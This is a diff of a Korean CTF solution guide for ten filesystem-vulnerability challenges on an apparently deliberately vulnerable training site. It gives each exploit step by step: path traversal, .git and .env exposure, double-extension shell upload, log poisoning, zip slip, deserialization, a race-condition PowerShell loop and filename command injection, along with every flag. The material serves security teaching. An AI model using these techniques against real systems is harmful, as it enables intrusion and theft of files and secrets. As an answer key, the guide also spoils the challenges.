@@ -63,32 +63,11 @@
   td code, th code { font-size: 9pt; }
 </style></head>
 <body><h1>C단계 (3장 로스팅, 파일 시스템 취약점) 풀이집</h1>
-<h2>실행 방법 (문제를 풀기 전에 먼저 하십시오)</h2>
-<p>이 문제들은 실제로 동작하는 서버이기 때문에, 풀기 전에 먼저 서버를 실행시켜야 합니다. 서버를 한 번만 실행하면 3장 10문제가 전부 그 서버 안에서 함께 동작하므로, 문제를 옮길 때마다 서버를 새로 켤 필요는 없습니다.</p>
-<p><strong>1. Node.js 설치 확인</strong></p>
-<p>PowerShell을 열고 아래 명령을 실행합니다.</p>
-<pre><code>node --version</code></pre>
-<p>버전 번호가 나오면 설치되어 있는 겁니다. "인식할 수 없다"는 오류가 나오면 nodejs.org에서 LTS 버전을 설치한 뒤 PowerShell을 새로 열어서 다시 시도합니다.</p>
-<p><strong>2. 통합 서버 실행</strong></p>
-<p>VSCode에서 <code>wargame problems</code> 폴더(이 <code>problems</code> 폴더의 바로 위 폴더)를 작업 폴더로 열고 터미널을 켜면, 아래 명령들이 그대로 통합니다(상대 경로라서 <code>wargame problems</code> 폴더를 어디로 옮기든 그대로 작동합니다). PowerShell 창을 하나만 열어서, 아래처럼 <code>c-filesystem</code> 폴더로 이동한 뒤 통합 서버를 실행합니다.</p>
-<pre><code>cd "problems\c-filesystem"
-node combined-server.js</code></pre>
-<p>실행 중이라는 메시지가 뜨면(<code>C단계 통합 서버 실행: http://localhost:3000/  (문제별 경로: /ch3/01 ~ /ch3/10)</code>), 그 창은 그대로 켜 둔 채로 브라우저에서 각 문제 주소(<code>http://localhost:3000/ch3/번호/</code>)에 접속하면 됩니다. 서버를 끄려면 그 창에서 <code>Ctrl+C</code>를 누릅니다.</p>
-<p><strong>배포된 사이트로 바로 확인하기</strong></p>
-<p>로컬 서버를 직접 띄우지 않고, 이미 배포된 사이트(<code>https://kload-wargame.onrender.com</code>)에서 바로 따라 해도 됩니다. 아래 모든 안내에서 <code>http://localhost:3000</code>을 <code>https://kload-wargame.onrender.com</code>으로 바꿔서 접속하면 똑같이 동작합니다. ("서버가 실행되면..." 같은 로컬 서버 실행 안내 문장은 이 경우 무시하면 됩니다.)</p>
-<p><strong>3. 전체 문제·경로 목록</strong></p>
-<table><thead><tr><th>문제</th><th>폴더</th><th>경로</th></tr></thead><tbody><tr><td>C1</td><td><code>01-open-backup</code></td><td><code>/ch3/01/</code></td></tr><tr><td>C2</td><td><code>02-path-traversal</code></td><td><code>/ch3/02/</code></td></tr><tr><td>C3</td><td><code>03-git-exposure</code></td><td><code>/ch3/03/</code></td></tr><tr><td>C4</td><td><code>04-env-leak</code></td><td><code>/ch3/04/</code></td></tr><tr><td>C5</td><td><code>05-double-ext-bypass</code></td><td><code>/ch3/05/</code></td></tr><tr><td>C6</td><td><code>06-lfi-log-poison</code></td><td><code>/ch3/06/</code></td></tr><tr><td>C7</td><td><code>07-bundle-slip</code></td><td><code>/ch3/07/</code></td></tr><tr><td>C8</td><td><code>08-phar-deserialize</code></td><td><code>/ch3/08/</code></td></tr><tr><td>C9</td><td><code>09-race-condition</code></td><td><code>/ch3/09/</code></td></tr><tr><td>C10</td><td><code>10-image-cmd-injection</code></td><td><code>/ch3/10/</code></td></tr></tbody></table>
 <h2>3장 · 01 (하) — 열려 있는 납품 서류 창고</h2>
 <p><strong>풀이 흐름:</strong> 메인 화면에서 <code>/ch3/01/backup/</code> 경로 힌트를 확인합니다 → 접속하면 폴더 안 파일 목록이 그대로 보입니다 → <code>flag.txt</code>를 클릭해 플래그를 확인합니다.</p>
 <p><strong>실행:</strong></p>
 <ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/01/</code> 입니다.</p>
-<ol>
-<li><code>http://localhost:3000/ch3/01/backup/</code>에 접속합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/01/backup/</code>에 접속합니다.</li>
 <li>파일 목록에서 <code>flag.txt</code>를 클릭합니다.</li>
 <li>플래그가 나옵니다.</li>
 </ol>
@@ -96,32 +75,21 @@ node combined-server.js</code></pre>
 <p><strong>취약점:</strong> 접근을 막아야 할 폴더에 안내 페이지(인덱스)가 없어서, 웹서버가 폴더 안 파일 목록을 그대로 보여줍니다(디렉토리 리스팅).</p>
 <h2>3장 · 02 (하) — 레시피 경로를 거슬러 올라가기</h2>
 <p><strong>풀이 흐름:</strong> 정상적인 파일명으로 다운로드가 되는지 확인합니다 → <code>file</code> 파라미터에 <code>../</code>를 넣어 상위 폴더로 거슬러 올라갑니다 → 레시피 폴더 밖의 <code>flag.txt</code>를 읽어냅니다.</p>
+<p><strong>화면 힌트:</strong> 문제 화면에 "notes 폴더 바로 옆에 secret 폴더가 그대로 남아있다는 소문이 있습니다"라는 안내가 떠 있습니다. 레시피를 찾는 폴더 이름이 <code>notes</code>이고 그 옆에 <code>secret</code> 폴더가 있다는 뜻이므로, <code>notes</code>에서 한 칸 위로 올라가(<code>../</code>) 옆의 <code>secret</code> 폴더로 들어가면 된다고 추론할 수 있습니다. 그래서 <code>file</code> 값으로 <code>../secret/flag.txt</code>를 시도합니다.</p>
 <p><strong>실행:</strong></p>
 <ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/02/</code> 입니다.</p>
-<ol>
-<li><code>http://localhost:3000/ch3/02/download?file=recipe1.txt</code>로 정상 동작을 확인합니다.</li>
-<li><code>http://localhost:3000/ch3/02/download?file=../secret/flag.txt</code>로 변경해 접속합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/02/download?file=recipe1.txt</code>로 정상 동작을 확인합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/02/download?file=../secret/flag.txt</code>로 변경해 접속합니다.</li>
 <li>플래그가 나옵니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_02_path_traversal}</code></p>
-<p><strong>취약점:</strong> <code>file</code> 파라미터를 경로 검증 없이 서버 폴더 경로와 그대로 결합합니다(<code>file_get_contents</code> 식 결합). <code>../</code>를 쓰면 지정된 폴더 밖으로 나갈 수 있습니다(경로 탐색, Path Traversal).</p>
+<p><strong>취약점:</strong> <code>file</code> 파라미터를 경로 검증 없이 서버 폴더 경로와 그대로 결합합니다(<code>file_get_contents</code> 식 결합). <code>../</code>를 쓰면 지정된 폴더 밖으로 나갈 수 있습니다(경로 탐색, Path Traversal). (단, 다른 문제 폴더나 게임 화면 쪽으로는 더 못 나가도록 자기 문제 폴더 안으로 경계가 막혀 있습니다.)</p>
 <h2>3장 · 03 (하) — 지워지지 않은 배포 흔적</h2>
 <p><strong>풀이 흐름:</strong> <code>.git</code> 폴더가 그대로 노출되어 있는지 확인합니다 → 폴더 목록을 따라 들어가 <code>logs</code> 폴더를 확인합니다 → 지워진 줄 알았던 파일에서 플래그를 확인합니다.</p>
 <p><strong>실행:</strong></p>
 <ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/03/</code> 입니다.</p>
-<ol>
-<li><code>http://localhost:3000/ch3/03/.git/</code>에 접속해 폴더가 노출되어 있음을 확인합니다.</li>
-<li>목록의 <code>logs</code>를 클릭해 <code>http://localhost:3000/ch3/03/.git/logs/</code>로 이동합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/03/.git/</code>에 접속해 폴더가 노출되어 있음을 확인합니다.</li>
+<li>목록의 <code>logs</code>를 클릭해 <code>https://kload-wargame.onrender.com/ch3/03/.git/logs/</code>로 이동합니다.</li>
 <li><code>old-recipe-flag.txt.orig</code>를 클릭합니다.</li>
 <li>플래그가 나옵니다.</li>
 </ol>
@@ -129,35 +97,25 @@ node combined-server.js</code></pre>
 <p><strong>취약점:</strong> 배포할 때 소스 관리 폴더(<code>.git</code>)까지 그대로 올라가서, 지금은 화면에 없는 과거 파일까지 그 폴더를 통해 찾을 수 있습니다. (실제 대회에서는 <code>git-dumper</code> 같은 도구로 <code>.git</code> 전체를 내려받아 커밋 히스토리를 복원하는 것이 정석입니다. 이 문제에서는 같은 교훈을 전용 도구 없이도 배울 수 있도록 폴더를 목록 형태로 단순화했습니다.)</p>
 <h2>3장 · 04 (중) — 환경설정이 적힌 쪽지</h2>
 <p><strong>풀이 흐름:</strong> 민감한 설정값이 보통 어디에 저장되는지 생각해봅니다 → <code>/ch3/04/.env</code> 경로로 직접 접속합니다 → 파일 내용에서 플래그를 확인합니다.</p>
+<p><strong>화면 힌트:</strong> 문제 화면에서 "페이지 소스 보기"(마우스 우클릭 → 페이지 소스 보기, 또는 Ctrl+U)를 하면, <code>.env</code> 파일이 아직 웹 루트에 그대로 있고 배포 스크립트에서 제외 처리가 안 됐다는 dev note 힌트가 숨겨져 있습니다. 여기서 민감한 설정이 담긴 파일 이름이 <code>.env</code>이며 바로 요청할 수 있다는 것을 알 수 있습니다.</p>
 <p><strong>실행:</strong></p>
 <ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/04/</code> 입니다.</p>
-<ol>
-<li><code>http://localhost:3000/ch3/04/.env</code>에 접속합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/04/.env</code>에 접속합니다.</li>
 <li>파일 내용 중 <code>FLAG=</code> 줄에서 플래그를 확인합니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_04_env_leak}</code></p>
 <p><strong>취약점:</strong> 비밀번호나 API 키 등 민감한 값을 모아두는 <code>.env</code> 설정 파일이 실수로 웹에서 바로 열리는 폴더에 놓여 있습니다.</p>
 <h2>3장 · 05 (중) — 사진처럼 보이는 레시피</h2>
 <p><strong>풀이 흐름:</strong> 이미지가 아닌 파일은 막히는 것을 확인합니다 → 파일명에 <code>.jpg</code>를 포함시키고 업로드 시 이미지 Content-Type으로 위장합니다 → 업로드된 파일에 접근해 플래그를 확인합니다.</p>
+<p><strong>화면 힌트:</strong> 문제 화면에서 "페이지 소스 보기"(마우스 우클릭 → 페이지 소스 보기, 또는 Ctrl+U)를 하면, 확장자 검사가 파일명에 <code>.php</code>라는 글자가 들어 있는지만 보고 정확히 <code>.php</code>로 끝나는지는 확인하지 않는다는 dev note 힌트가 숨겨져 있습니다.</p>
 <p><strong>실행:</strong></p>
-<ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/05/</code> 입니다.</p>
 <ol>
 <li>아래 내용으로 <code>shell.php.jpg</code> 파일을 만듭니다.</li>
 </ol>
 <pre><code>   &lt;shell&gt;&lt;&lt;EXEC&gt;&gt;&lt;/shell&gt;</code></pre>
 <ol>
-<li><code>http://localhost:3000/ch3/05/</code>에서 이 파일을 업로드합니다(브라우저 폼으로 업로드하면 Content-Type은 브라우저가 자동으로 <code>image/jpeg</code>로 보냅니다. 수동으로 확인하려면 개발자 도구의 Network 탭에서 업로드 요청의 Content-Type을 확인하십시오).</li>
-<li><code>http://localhost:3000/ch3/05/uploads/shell.php.jpg?cmd=flag</code>에 접속합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/05/</code>에서 이 파일을 업로드합니다(브라우저 폼으로 업로드하면 Content-Type은 브라우저가 자동으로 <code>image/jpeg</code>로 보냅니다. 수동으로 확인하려면 개발자 도구의 Network 탭에서 업로드 요청의 Content-Type을 확인하십시오).</li>
+<li><code>https://kload-wargame.onrender.com/ch3/05/uploads/shell.php.jpg?cmd=flag</code>에 접속합니다.</li>
 <li>플래그가 나옵니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_05_double_ext_bypass}</code></p>
@@ -166,30 +124,19 @@ node combined-server.js</code></pre>
 <p><strong>풀이 흐름:</strong> User-Agent에 실행 표식을 심어 사이트를 한 번 방문합니다 → <code>name</code> 파라미터에 <code>access</code>를 넣어 접속 기록 자체를 불러오게 만듭니다 → 기록 안에 심어둔 표식이 실행 조건과 맞아떨어져 플래그가 나옵니다.</p>
 <p><strong>실행:</strong></p>
 <ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/06/</code> 입니다.</p>
-<ol>
 <li>PowerShell에서 아래 명령으로 User-Agent에 표식을 심어 한 번 접속합니다.</li>
 </ol>
-<pre><code>   Invoke-WebRequest -Uri "http://localhost:3000/ch3/06/" -UserAgent "&lt;&lt;EXEC&gt;&gt;" -UseBasicParsing</code></pre>
+<pre><code>   Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch3/06/" -UserAgent "&lt;&lt;EXEC&gt;&gt;" -UseBasicParsing</code></pre>
 <ol>
-<li><code>http://localhost:3000/ch3/06/page?name=access&amp;cmd=flag</code>에 접속합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/06/page?name=access&amp;cmd=flag</code>에 접속합니다.</li>
 <li>플래그가 나옵니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_06_lfi_log_poison}</code></p>
 <p><strong>취약점:</strong> <code>name</code> 파라미터를 검증 없이 그대로 불러오는 로컬 파일 포함(LFI) 취약점입니다. 직접 쓰기가 불가능한 곳이라도, 누구나 값을 남길 수 있는 접속 기록(로그)에 코드를 심어두고 그 로그 파일 자체를 불러오게 만들면 코드가 실행됩니다(로그 포이즈닝).</p>
 <h2>3장 · 07 (중) — 압축을 풀면 열리는 뒷문</h2>
 <p><strong>풀이 흐름:</strong> 묶음 파일 형식을 확인합니다 → 항목 이름에 상위 경로(<code>../</code>)를 넣어 웹에서 실행 가능한 위치를 가리키게 만듭니다 → 그 위치에 심어진 파일에 접근해 플래그를 확인합니다.</p>
+<p><strong>화면 힌트:</strong> 문제 화면에서 "페이지 소스 보기"를 하면, 결과 파일이 놓이는 폴더 이름(<code>live/</code>)이 dev note 힌트로 노출되어 있습니다.</p>
 <p><strong>실행:</strong></p>
-<ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/07/</code> 입니다.</p>
 <ol>
 <li>아래 내용으로 <code>b.bundle</code> 파일을 만듭니다.</li>
 </ol>
@@ -197,21 +144,16 @@ node combined-server.js</code></pre>
    &lt;&lt;EXEC&gt;&gt;
    #END</code></pre>
 <ol>
-<li><code>http://localhost:3000/ch3/07/</code>에서 이 파일을 업로드합니다.</li>
-<li><code>http://localhost:3000/ch3/07/live/shell.txt?cmd=flag</code>에 접속합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/07/</code>에서 이 파일을 업로드합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/07/live/shell.txt?cmd=flag</code>에 접속합니다.</li>
 <li>플래그가 나옵니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_07_bundle_slip}</code></p>
-<p><strong>취약점:</strong> 묶음(압축) 파일을 풀 때 각 항목의 "이름"에 상위 경로가 포함되어 있어도 검사하지 않고 그대로 믿습니다. 항목 이름을 조작하면 원래 지정된 폴더 밖, 웹에서 실행 가능한 위치에 파일을 심을 수 있습니다(Zip Slip과 같은 원리).</p>
+<p><strong>취약점:</strong> 묶음(압축) 파일을 풀 때 각 항목의 "이름"에 상위 경로가 포함되어 있어도 검사하지 않고 그대로 믿습니다. 항목 이름을 조작하면 원래 지정된 폴더 밖, 웹에서 실행 가능한 위치에 파일을 심을 수 있습니다(Zip Slip과 같은 원리). (단, 다른 문제 폴더나 게임 화면 쪽으로는 더 못 나가도록 자기 문제 폴더 안으로 경계가 막혀 있습니다.)</p>
 <h2>3장 · 08 (상) — 압축 안에 숨은 객체</h2>
 <p><strong>풀이 흐름:</strong> "객체 묶음" 형식을 확인합니다 → 위험한 클래스 표식이 담긴 묶음을 업로드합니다 → 단순히 "존재 확인"만 요청해도 내부 객체가 자동으로 복원되어 동작하는 것을 확인합니다.</p>
+<p><strong>화면 힌트:</strong> 문제 화면에서 "페이지 소스 보기"를 하면, <code>LogCleaner</code> 클래스의 소멸자가 역직렬화될 때 자동으로 실행된다는 dev note 힌트가 숨겨져 있습니다. 여기서 묶음에 심어야 할 위험한 클래스 이름이 <code>LogCleaner</code>라는 것을 알 수 있습니다.</p>
 <p><strong>실행:</strong></p>
-<ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/08/</code> 입니다.</p>
 <ol>
 <li>아래 내용으로 <code>evil.bundle</code> 파일을 만듭니다.</li>
 </ol>
@@ -219,8 +161,8 @@ node combined-server.js</code></pre>
    CLASS:LogCleaner
    #END</code></pre>
 <ol>
-<li><code>http://localhost:3000/ch3/08/</code>에서 이 파일을 업로드합니다.</li>
-<li><code>http://localhost:3000/ch3/08/check-object?name=evil.bundle</code>에 접속합니다(이름은 "존재 확인"일 뿐인데도 내부 객체가 복원됩니다).</li>
+<li><code>https://kload-wargame.onrender.com/ch3/08/</code>에서 이 파일을 업로드합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/08/check-object?name=evil.bundle</code>에 접속합니다(이름은 "존재 확인"일 뿐인데도 내부 객체가 복원됩니다).</li>
 <li>플래그가 나옵니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_08_phar_deserialize}</code></p>
@@ -228,12 +170,6 @@ node combined-server.js</code></pre>
 <h2>3장 · 09 (상) — 검사와 삭제 사이의 짧은 순간</h2>
 <p><strong>풀이 흐름:</strong> 업로드하면 결국 위험 판정으로 삭제된다는 것을 확인합니다 → 삭제되기 전의 짧은 시간 동안 실행 조건으로 반복 접근합니다 → 삭제되기 전에 들어간 요청에서 플래그를 확인합니다.</p>
 <p><strong>실행:</strong></p>
-<ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/09/</code> 입니다.</p>
 <ol>
 <li>아래 내용으로 <code>shell.txt</code> 파일을 만듭니다.</li>
 </ol>
@@ -243,36 +179,32 @@ node combined-server.js</code></pre>
 </ol>
 <pre><code>   $filePath = "shell.txt 파일의 전체 경로"
    $form = @{ recipe = Get-Item -Path $filePath }
-   Invoke-WebRequest -Uri "http://localhost:3000/ch3/09/upload" -Method POST -Form $form -UseBasicParsing | Out-Null
+   Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch3/09/upload" -Method POST -Form $form -UseBasicParsing | Out-Null
    $deadline = (Get-Date).AddMilliseconds(350)
    while ((Get-Date) -lt $deadline) {
-       $resp = Invoke-WebRequest -Uri "http://localhost:3000/ch3/09/uploads/shell.txt?cmd=flag" -UseBasicParsing
+       $resp = Invoke-WebRequest -Uri "https://kload-wargame.onrender.com/ch3/09/uploads/shell.txt?cmd=flag" -UseBasicParsing
        if ($resp.Content -match "ROAST\{[^}]*\}") {
            Write-Host $matches[0]
            break
        }
    }</code></pre>
 <ol>
-<li>성공하면 콘솔에 플래그가 출력됩니다. 실패하면(삭제 타이밍을 놓치면) 3번을 다시 실행해 보십시오.</li>
+<li>성공하면 콘솔에 플래그가 출력됩니다. 실패하면(삭제 타이밍을 놓치면) 2번을 다시 실행해 보십시오.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_09_race_condition}</code></p>
 <p><strong>취약점:</strong> 업로드 기능이 파일을 먼저 "실행 가능한 위치"에 저장한 다음에야 내용을 검사하고, 위험하면 그제서야 지웁니다. "저장 완료 시점"과 "위험 판정 후 삭제 시점" 사이에 파일이 실행 가능한 상태로 짧게 존재하는 레이스 컨디션(TOCTOU, Time-Of-Check to Time-Of-Use)이 있습니다.</p>
 <h2>3장 · 10 (상, 3장 마지막 문제) — 이미지 처리 프로그램 커맨드 인젝션</h2>
 <p><strong>풀이 흐름:</strong> 업로드된 사진이 외부 이미지 처리 프로그램으로 자동 변환된다는 것을 확인합니다 → 파일 이름 안에 셸 명령처럼 보이는 패턴을 심어 업로드합니다 → 잠시 뒤 처리 상태를 확인해 명령이 실행됐는지 봅니다.</p>
+<p><strong>화면 힌트:</strong> 문제 화면에서 "페이지 소스 보기"를 하면, 오래된 이미지 처리 프로그램이 파일 이름 안의 역따옴표(`<code> </code> ``)로 감싼 부분을 셸 명령으로 착각해 실행한다는 dev note 힌트(ImageTragick류)가 숨겨져 있습니다. 여기서 파일 이름에 역따옴표로 감싼 명령 패턴을 심어야 한다는 것을 알 수 있습니다.</p>
+<p><strong>참고:</strong> 이 문제는 방문자(세션)별로 결과가 분리되어 있어, 다른 팀이 먼저 풀었어도 내가 직접 풀기 전까지는 내 화면에 플래그가 보이지 않습니다.</p>
 <p><strong>실행:</strong></p>
-<ol>
-<li>터미널(PowerShell)을 열고 서버를 실행합니다.</li>
-</ol>
-<pre><code>   cd "problems\c-filesystem"</code></pre>
-<pre><code>   node combined-server.js</code></pre>
-<p>   서버가 실행되면, 그 창은 그대로 켜 둔 채로 다음 단계를 진행합니다(끌 때는 그 창에서 <code>Ctrl+C</code>). 문제 주소는 <code>http://localhost:3000/ch3/10/</code> 입니다.</p>
 <ol>
 <li>파일명을 다음과 같이 지정해 아무 내용이나 담긴 파일을 업로드합니다.</li>
 </ol>
 <pre><code>   pic`FLAG_CMD`.jpg</code></pre>
 <ol>
-<li><code>http://localhost:3000/ch3/10/</code>에서 이 파일명으로 업로드합니다.</li>
-<li>1초 정도 기다린 뒤 <code>http://localhost:3000/ch3/10/thumbnail-status</code>에 접속합니다.</li>
+<li><code>https://kload-wargame.onrender.com/ch3/10/</code>에서 이 파일명으로 업로드합니다.</li>
+<li>1초 정도 기다린 뒤 <code>https://kload-wargame.onrender.com/ch3/10/thumbnail-status</code>에 접속합니다.</li>
 <li>"명령 실행됨" 화면에서 전체 워게임 최종 플래그가 나옵니다.</li>
 </ol>
 <p><strong>플래그:</strong> <code>ROAST{ch3_10_image_cmd_injection}</code></p>
